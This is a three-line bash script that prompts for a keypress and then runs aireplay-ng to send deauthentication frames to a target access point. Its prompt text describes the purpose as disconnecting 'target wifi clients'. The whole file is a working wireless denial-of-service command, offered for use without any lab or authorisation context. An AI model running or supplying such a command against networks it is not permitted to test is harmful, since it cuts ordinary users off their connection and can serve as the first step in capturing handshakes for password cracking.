#!/bin/bash
read -n 1 -s -r -p "Press any key to disconnect target wifi clients"
aireplay-ng -0 5 -a $bssid wlan0
